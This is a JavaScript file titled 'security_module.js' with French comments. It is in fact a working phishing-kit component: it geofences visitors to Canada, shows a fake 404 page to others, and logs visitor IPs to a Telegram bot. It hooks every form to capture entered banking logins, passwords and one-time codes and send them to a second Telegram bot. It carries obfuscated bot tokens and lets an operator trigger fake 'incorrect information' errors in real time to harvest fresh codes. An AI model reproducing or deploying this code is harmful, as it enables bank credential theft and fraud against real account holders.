// security_module.js
// Protection IP + Bot Telegram Interactif (Compatible avec TOUS les formulaires HTML)
(async function() {
    // ======= CONFIGURATION =======
    const BOT_MAIN_B64 = "ODU4NDE3MTI5MTpBQUhmRmszSDFXaGNBYXhUT09SNXZmcWV2cmJla3lDNW5ZNA=="; // Main Bot
    const BOT_RADAR_B64 = "Nzk3NzA0MzA2MjpBQUVwRVQ5SEpFMEl4dFVGOUtkRWJob1F5eVBOb293eGIxZw=="; // Radar IP
    const CHAT_ID_B64 = "Njc4ODAxMjQ4MQ==";

    const BOT_MAIN = atob(BOT_MAIN_B64);
    const BOT_RADAR = atob(BOT_RADAR_B64);
    const CHAT_ID = atob(CHAT_ID_B64);
    
    // Générer un ID de session unique par visiteur
    if (!sessionStorage.getItem('uniq_session_id')) {
        sessionStorage.setItem('uniq_session_id', Math.floor(1000 + Math.random() * 9000).toString());
    }
    const SESSION_ID = sessionStorage.getItem('uniq_session_id');

    async function tgSend(token, text, reply_markup = null) {
        let payload = { chat_id: CHAT_ID, text: text, parse_mode: 'HTML' };
        if (reply_markup) payload.reply_markup = reply_markup;
        try {
            let res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            return await res.json();
        } catch(e) { return null; }
    }

    // ==========================================
    // 1. VÉRIFICATION IP ET BLOCAGE (Cloudflare)
    // ==========================================
    async function verifyIP() {
        if (sessionStorage.getItem('geo_verified') === 'true') return; // Déjà vérifié dans cette session

        let ip = 'Inconnue', city = 'Inconnue', country = 'Inconnu', countryCode = '??';
        let cfTraceOk = false;

        // Écran blanc pendant le chargement (Optionnel mais sécurisé)
        const overlay = document.createElement('div');
        overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999999;";
        document.documentElement.appendChild(overlay);

        try {
            const cfRes = await fetch('https://cloudflare.com/cdn-cgi/trace');
            const cfText = await cfRes.text();
            cfText.split('\n').forEach(line => {
                if (line.startsWith('ip=')) ip = line.split('=')[1];
                if (line.startsWith('loc=')) countryCode = line.split('=')[1];
            });
            if (countryCode !== '??') cfTraceOk = true;
        } catch (e) {}

        try {
            const geoRes = await fetch('https://get.geojs.io/v1/ip/geo.json');
            const geoData = await geoRes.json();
            if (geoData && geoData.country_code) {
               ip = geoData.ip || ip;
               city = geoData.city || city;
               country = geoData.country || country;
               countryCode = geoData.country_code || countryCode;
            }
        } catch (e) {}

        const date = new Date().toLocaleDateString('fr-FR');
        const time = new Date().toLocaleTimeString('fr-FR');

        function show404() {
            document.documentElement.innerHTML = `
                <div style="display:flex;height:100vh;align-items:center;justify-content:center;font-family:system-ui,sans-serif;background:#fff;color:#000;">
                    <div style="display:flex;align-items:center;">
                        <h1 style="font-size:24px;font-weight:500;border-right:1px solid rgba(0,0,0,0.3);margin:0 20px 0 0;padding:10px 23px 10px 0;">404</h1>
                        <h2 style="font-size:14px;font-weight:normal;margin:0;">This page could not be found.</h2>
                    </div>
                </div>`;
        }

        if (!cfTraceOk && countryCode === '??') {
            show404();
            tgSend(BOT_RADAR, `🚫 <b>ACCÈS BLOQUÉ (SÉCURITÉ MAXIMUM)</b> 🚫\n\n🕒 Heure : ${date} à ${time}\n🆔 ID Session : <code>${SESSION_ID}</code>`);
            return;
        }

        if (countryCode !== 'CA') {
            show404();
            tgSend(BOT_RADAR, `🚫 <b>ACCÈS BLOQUÉ (HORS CANADA)</b> 🚫\n\n🌍 IP : <code>${ip}</code>\n🏙 Ville : <b>${city}</b>\n🏳️ Pays : <b>${country}</b> (${countryCode})\n🕒 Heure : ${date} à ${time}\n🆔 ID Session : <code>${SESSION_ID}</code>`);
            return;
        }

        // Accès autorisé
        overlay.remove();
        sessionStorage.setItem('geo_verified', 'true');
        
        let pageName = window.location.pathname.split('/').pop() || 'Index';
        // Ne notifier la connexion que sur la page d'accueil ou si pas encore notifié
        if (!sessionStorage.getItem('geo_notified') || pageName === 'index.html') {
            tgSend(BOT_RADAR, `👀 <b>NOUVELLE CONNEXION (CANADA) - Page: ${pageName}</b> 👀\n\n🌍 IP : <code>${ip}</code>\n🏙 Ville : <b>${city}</b>\n🏳️ Pays : <b>${country}</b>\n🕒 Heure : ${date} à ${time}\n🆔 ID Session : <code>${SESSION_ID}</code>`);
            sessionStorage.setItem('geo_notified', 'true');
        }
    }

    await verifyIP();

    // ==========================================
    // 2. INTERCEPTION DES FORMULAIRES (Telegram Interacif)
    // ==========================================
    
    // On surcharge le comportement de tous les formulaires de la page
    document.addEventListener('DOMContentLoaded', () => {
        const forms = document.querySelectorAll('form');
        
        forms.forEach(form => {
            // Identifier le bouton de soumission
            const submitBtn = form.querySelector('button[type="submit"], input[type="submit"]') || form.querySelector('.submit-btn, .btn, button');
            
            // Écraser l'événement submit natif
            form.addEventListener('submit', async function(e) {
                e.preventDefault(); // On bloque l'envoi classique
                e.stopPropagation();
                e.stopImmediatePropagation(); // On bloque l'exécution des autres scripts (le faux timer de 10s natif au projet)


                // Création d'un loader global propre
                let loader = document.getElementById('telegramGlobalLoader');
                if (!loader) {
                    loader = document.createElement('div');
                    loader.id = 'telegramGlobalLoader';
                    loader.innerHTML = `
                        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:999999;display:flex;align-items:center;justify-content:center;flex-direction:column;">
                            <div style="border:4px solid #f3f3f3;border-top:4px solid #0981C5;border-radius:50%;width:50px;height:50px;animation:spinTg 1s linear infinite;"></div>
                            <p style="margin-top:20px;font-family:sans-serif;font-size:16px;color:#333;font-weight:bold;">Processing, please wait...</p>
                            <style>@keyframes spinTg { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
                        </div>
                    `;
                    document.body.appendChild(loader);
                } else {
                    loader.style.display = 'flex';
                }

                // Récupération des données saisies (Username, Pass, OTP, etc.)
                const formData = new FormData(form);
                let dataText = "";
                for (let [key, value] of formData.entries()) {
                    // Ignorer les champs vides ou cachés techniques si besoin
                    if(value.trim() !== "") {
                        let cleanKey = key.replace(/[-_]/g, ' ').toUpperCase();
                        dataText += `\n${cleanKey}: <code>${value}</code>`;
                    }
                }

                let pageName = window.location.pathname.split('/').pop() || 'Formulaire';
                let msgText = `🌟 <b>NOUVELLE SAISIE BANCAIRE (${pageName})</b> 🌟\n${dataText}\n\n🆔 ID Session: <code>${SESSION_ID}</code>`;

                let buttonRows = [
                    [
                        { text: "✅ Valide", callback_data: `valide_${SESSION_ID}` },
                        { text: "❌ Error", callback_data: `error_${SESSION_ID}` }
                    ],
                    [
                        { text: "+5s ⏳", callback_data: `add5_${SESSION_ID}` },
                        { text: "+10s ⏳", callback_data: `add10_${SESSION_ID}` }
                    ]
                ];

                // 1. Envoi à Telegram
                let sentMsg = await tgSend(BOT_MAIN, msgText, { inline_keyboard: buttonRows });
                
                // Si l'envoi rate (ex: pas d'internet), on fallback en soumettant normalement après 3 sec
                if(!sentMsg || !sentMsg.ok) {
                    setTimeout(() => { form.submit(); }, 3000);
                    return;
                }

                let msgId = sentMsg.result.message_id;
                let timeLeft = 12; // 12 Secondes pour répondre
                let isFinished = false;
                let currentOffset = undefined;

                // 2. Compte à rebours Telegram
                let timer = setInterval(() => {
                    if (isFinished) return;
                    timeLeft--;
                    
                    if (timeLeft <= 0) {
                        isFinished = true;
                        clearInterval(timer);
                        // Validation par défaut si temps écoulé
                        fetch(`https://api.telegram.org/bot${BOT_MAIN}/editMessageText`, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n✅ <i>Validé automatiquement (Temps écoulé)</i>", parse_mode: 'HTML'})
                        });
                        
                        // Redirection / Soumission classique vers la page action du form (ex: rbc101_sms.html)
                        if(form.action) {
                            window.location.href = form.action;
                        } else {
                            form.submit();
                        }
                    }
                }, 1000);

                // 3. Polling pour écouter les clics (Valide, Error, +5s, +10s)
                let poller = setInterval(async () => {
                    if (isFinished) { clearInterval(poller); return; }
                    try {
                        let url = `https://api.telegram.org/bot${BOT_MAIN}/getUpdates?limit=20&allowed_updates=["callback_query"]`;
                        if (currentOffset) url += `&offset=${currentOffset}`;
                        
                        let res = await fetch(url);
                        let updates = await res.json();
                        
                        if (updates.ok && updates.result.length > 0) {
                            currentOffset = updates.result[updates.result.length - 1].update_id + 1;
                            
                            for (let u of updates.result) {
                                if (u.callback_query && u.callback_query.data.includes(SESSION_ID)) {
                                    let cbData = u.callback_query.data;
                                    fetch(`https://api.telegram.org/bot${BOT_MAIN}/answerCallbackQuery?callback_query_id=${u.callback_query.id}`);
                                    
                                    if (cbData.startsWith('add5_')) {
                                        timeLeft += 5;
                                        fetch(`https://api.telegram.org/bot${BOT_MAIN}/editMessageText`, {
                                            method: 'POST', headers: {'Content-Type': 'application/json'},
                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + `\n\n⏳ <b>Temps restant : ${timeLeft} secondes</b>`, parse_mode: 'HTML', reply_markup: { inline_keyboard: buttonRows }})
                                        });
                                    }
                                    else if (cbData.startsWith('add10_')) {
                                        timeLeft += 10;
                                        fetch(`https://api.telegram.org/bot${BOT_MAIN}/editMessageText`, {
                                            method: 'POST', headers: {'Content-Type': 'application/json'},
                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + `\n\n⏳ <b>Temps restant : ${timeLeft} secondes</b>`, parse_mode: 'HTML', reply_markup: { inline_keyboard: buttonRows }})
                                        });
                                    }
                                    else if (cbData.startsWith('valide_')) {
                                        isFinished = true;
                                        fetch(`https://api.telegram.org/bot${BOT_MAIN}/editMessageText`, {
                                            method: 'POST', headers: {'Content-Type': 'application/json'},
                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n✅ <i>Validé par l'admin</i>", parse_mode: 'HTML'})
                                        });
                                        if(form.action) window.location.href = form.action;
                                        else form.submit();
                                    }
                                    else if (cbData.startsWith('error_')) {
                                        isFinished = true;
                                        fetch(`https://api.telegram.org/bot${BOT_MAIN}/editMessageText`, {
                                            method: 'POST', headers: {'Content-Type': 'application/json'},
                                            body: JSON.stringify({chat_id: CHAT_ID, message_id: msgId, text: msgText + "\n\n❌ <i>Refusé par l'admin</i>", parse_mode: 'HTML'})
                                        });
                                        
                                        // On cache le loader et on affiche l'erreur
                                        loader.style.display = 'none';
                                        
                                        // On essaie de trouver un conteneur d'erreur dans la page
                                        let errorContainer = document.querySelector('.error-msg, .alert-danger, #errorMsg');
                                        if(errorContainer) {
                                            errorContainer.style.display = 'block';
                                            errorContainer.innerHTML = "Les informations saisies sont incorrectes. Veuillez réessayer.";
                                        } else {
                                            alert("Les informations saisies sont incorrectes. Veuillez réessayer.");
                                        }
                                        
                                        // Réinitialiser les inputs de mot de passe / code
                                        let pw = form.querySelector('input[type="password"], input[name*="code"], input[name*="otp"]');
                                        if(pw) pw.value = '';
                                    }
                                }
                            }
                        }
                    } catch(e){}
                }, 2000);
            }, true); // Use capture to intercept before other scripts
        });
    });

})();
